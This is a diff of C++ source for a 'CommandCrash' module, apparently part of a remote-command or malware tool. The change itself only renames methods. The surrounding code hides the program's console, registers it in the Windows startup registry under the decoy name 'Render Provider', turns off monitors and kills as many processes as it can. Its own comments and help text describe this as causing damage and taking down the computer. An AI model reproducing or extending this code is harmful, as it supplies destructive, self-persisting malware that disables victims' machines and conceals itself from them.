@@ -21,16 +21,16 @@ void CommandCrash::run(ParsedCommand* Parsed)
 	ShowWindow(console, 0);
 
 	//Register in startup, just to cause more damage.
-	this->RegisterProgram();
+	this->registerProgram();
 
 	//Turn off the moniter(s)
 	thread* moniter = new thread(&CommandCrash::turnOffMoniter, this);
 
 	//Kill as many processes as possible, to free up resources, and reduce resistance.
-	thread* processKiller = new thread(&CommandCrash::AttackProcesses, this);
+	thread* processKiller = new thread(&CommandCrash::attackProcesses, this);
 }
 
-void CommandCrash::AttackProcesses()
+void CommandCrash::attackProcesses()
 {
 	WCHAR path[260];
 	GetModuleFileName(NULL, path, 260);
@@ -106,7 +106,7 @@ string* CommandCrash::getHelp()
 	return new string("Takes down your computer. Good luck getting it back without a hard shutdown.");
 }
 
-bool CommandCrash::IsMyProgramRegisteredForStartup(wchar_t* pszAppName)
+bool CommandCrash::isMyProgramRegisteredForStartup(wchar_t* pszAppName)
 {
 	HKEY hKey = NULL;
 	long lResult = 0;
@@ -139,7 +139,7 @@ bool CommandCrash::IsMyProgramRegisteredForStartup(wchar_t* pszAppName)
 	return fSuccess;
 }
 
-bool CommandCrash::RegisterMyProgramForStartup(wchar_t* pszAppName, wchar_t* pathToExe, wchar_t* args)
+bool CommandCrash::registerMyProgramForStartup(wchar_t* pszAppName, wchar_t* pathToExe, wchar_t* args)
 {
 	HKEY hKey = NULL;
 	long lResult = 0;
@@ -180,10 +180,10 @@ bool CommandCrash::RegisterMyProgramForStartup(wchar_t* pszAppName, wchar_t* pat
 	return fSuccess;
 }
 
-void CommandCrash::RegisterProgram()
+void CommandCrash::registerProgram()
 {
 	wchar_t szPathToExe[MAX_PATH];
 
 	GetModuleFileNameW(NULL, szPathToExe, MAX_PATH);
-	RegisterMyProgramForStartup(L"Render Provider", szPathToExe, L"crash");
+	registerMyProgramForStartup(L"Render Provider", szPathToExe, L"crash");
 }
